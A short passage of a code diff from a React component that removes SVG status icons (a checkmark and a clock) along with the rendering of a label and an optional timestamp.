-          <polyline points="22 4 12 14.01 9 11.01"></polyline>
-        </svg>
-      ) : (
-        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-          <circle cx="12" cy="12" r="10"></circle>
-          <polyline points="12 6 12 12 16 14"></polyline>
-        </svg>
-      )}
-      {label}
-      {completed && timestamp && (
-        <span className="ml-1 text-xs text-gray-500">
-          {timestamp}
-        </span>
-      )}
     </div>
   );
 } 
